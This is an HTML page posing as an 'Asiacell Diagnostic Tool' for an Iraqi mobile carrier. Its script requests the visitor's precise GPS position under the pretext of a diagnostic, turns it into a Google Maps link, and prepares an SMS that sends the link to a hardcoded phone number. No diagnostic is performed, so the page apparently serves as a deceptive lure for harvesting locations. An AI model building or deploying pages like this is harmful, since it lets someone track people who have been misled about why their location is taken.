<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Asiacell Location Check</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f8f9fa;
      text-align: center;
      padding: 20px;
      margin: 0;
      direction: ltr;
    }
    h1 {
      color: #b80000;
      font-size: 26px;
      margin-bottom: 10px;
    }
    button {
      padding: 14px 28px;
      font-size: 18px;
      background-color: #b80000;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    #loader {
      display: none;
      margin-top: 30px;
    }
    .circle-loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #b80000;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
      margin: 0 auto 10px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #status-message {
      font-weight: bold;
      color: #b80000;
    }
    #success-check {
      display: none;
      font-size: 40px;
      color: green;
      margin-top: 20px;
    }
    #send-button {
      margin-top: 30px;
      display: none;
    }
  </style>
</head>
<body>

  <h1 id="title">Asiacell Diagnostic Tool</h1>
  <p id="instruction">To proceed, please enable your GPS and location permission.</p>
  <button id="start-btn" onclick="startLocationCheck()">🚀 Start Diagnostic</button>

  <div id="loader">
    <div class="circle-loader"></div>
    <div id="status-message">Checking Location...</div>
  </div>

  <div id="success-check">✅</div>
  <button id="send-button">📩 Send Location</button>

  <script>
    let locationResult = "";

    const userLang = (navigator.languages && navigator.languages[0].startsWith("ar")) ||
                     navigator.language.startsWith("ar") ? "ar" : "en";
    const isiOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
    const isAndroid = /Android/i.test(navigator.userAgent);

    function getBrowserName() {
      const ua = navigator.userAgent;
      if (/chrome|crios/i.test(ua) && !/edge|opr/i.test(ua)) return "chrome";
      if (/firefox/i.test(ua)) return "firefox";
      if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) return "safari";
      if (/edg/i.test(ua)) return "edge";
      return "other";
    }

    const browser = getBrowserName();

    const translations = {
      en: {
        title: "Asiacell Diagnostic Tool",
        instruction: "To proceed, please enable your GPS and location permission.",
        checking: "Checking Location...",
        startBtn: "🚀 Start Diagnostic",
        sendBtn: "📩 Send Location",
        alertPermission: "Please enable location permission in your browser settings.",
        alertGPS: "Please enable GPS in your device settings.",
        alertError: "Error accessing location. Please try again.",
        alertNotAcquired: "Location not acquired yet.",
        stepsSafari: "Go to Settings > Safari > Location > Allow OR Settings > Privacy > Location Services > Safari Websites > Allow.",
        stepsChrome: "For Chrome: Settings > Privacy & Security > Site Settings > Location > Allow",
        stepsFirefox: "For Firefox: Settings > Permissions > Location > Allow",
        defaultSteps: "Please enable location from browser settings."
      },
      ar: {
        title: "أداة تشخيص آسياسيل",
        instruction: "للمتابعة، يرجى تفعيل خدمة الموقع الجغرافي ومنح الإذن للمتصفح.",
        checking: "جارٍ التحقق من الموقع...",
        startBtn: "🚀 بدء التشخيص",
        sendBtn: "📩 إرسال الموقع",
        alertPermission: "يرجى تفعيل إذن الوصول للموقع من إعدادات المتصفح.",
        alertGPS: "يرجى تفعيل خدمة الموقع (GPS) من إعدادات الجهاز.",
        alertError: "حدث خطأ أثناء الوصول إلى الموقع، يرجى المحاولة لاحقاً.",
        alertNotAcquired: "لم يتم تحديد الموقع بعد.",
        stepsSafari: "اذهب إلى الإعدادات > Safari > الموقع > سماح أو الإعدادات > الخصوصية > خدمات الموقع > مواقع Safari > السماح.",
        stepsChrome: "لمتصفح Chrome: الإعدادات > الخصوصية والأمان > إعدادات الموقع > الموقع > السماح.",
        stepsFirefox: "لمتصفح Firefox: الإعدادات > الأذونات > الموقع > السماح.",
        defaultSteps: "يرجى تفعيل الموقع من إعدادات المتصفح."
      }
    };

    const t = translations[userLang];
    const browserSteps = browser === "safari" ? t.stepsSafari :
                         browser === "chrome" ? t.stepsChrome :
                         browser === "firefox" ? t.stepsFirefox : t.defaultSteps;

    // Apply translations
    document.getElementById("title").innerText = t.title;
    document.getElementById("instruction").innerText = t.instruction;
    document.getElementById("status-message").innerText = t.checking;
    document.getElementById("start-btn").innerText = t.startBtn;
    document.getElementById("send-button").innerText = t.sendBtn;
    if (userLang === "ar") document.body.style.direction = "rtl";

    function startLocationCheck() {
      document.getElementById("loader").style.display = "block";
      document.getElementById("success-check").style.display = "none";
      document.getElementById("send-button").style.display = "none";

      if (!navigator.geolocation) {
        alert(`${t.alertPermission}\n\n${browserSteps}`);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          locationResult = `https://maps.google.com/?q=${lat},${lon}`;
          document.getElementById("loader").style.display = "none";
          document.getElementById("success-check").style.display = "block";
          document.getElementById("send-button").style.display = "inline-block";
        },
        (err) => {
          document.getElementById("loader").style.display = "none";
          let fullMsg = "";

          if (isiOS && (err.code === err.PERMISSION_DENIED || err.code === err.POSITION_UNAVAILABLE)) {
            fullMsg = `${t.alertPermission}\n\n${browserSteps}`;
          } else if (err.code === err.PERMISSION_DENIED) {
            fullMsg = `${t.alertPermission}\n\n${browserSteps}`;
          } else if (err.code === err.POSITION_UNAVAILABLE || err.code === err.TIMEOUT) {
            fullMsg = t.alertGPS;
          } else {
            fullMsg = t.alertError;
          }

          alert(fullMsg);
          setTimeout(() => {
            location.reload();
          }, 3000);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000
        }
      );
    }

    document.getElementById("send-button").addEventListener("click", function () {
      if (!locationResult) {
        alert(t.alertNotAcquired);
        return;
      }
      const smsNumber = "+9647701180059";
      const smsBody = encodeURIComponent(
        (userLang === "ar" ? "نتيجة أداة التشخيص:\n" : "Asiacell Diagnostic Result:\n") + locationResult
      );
      const smsLink = `sms:${smsNumber}?body=${smsBody}`;
      window.location.href = smsLink;
    });
  </script>

</body>
</html>
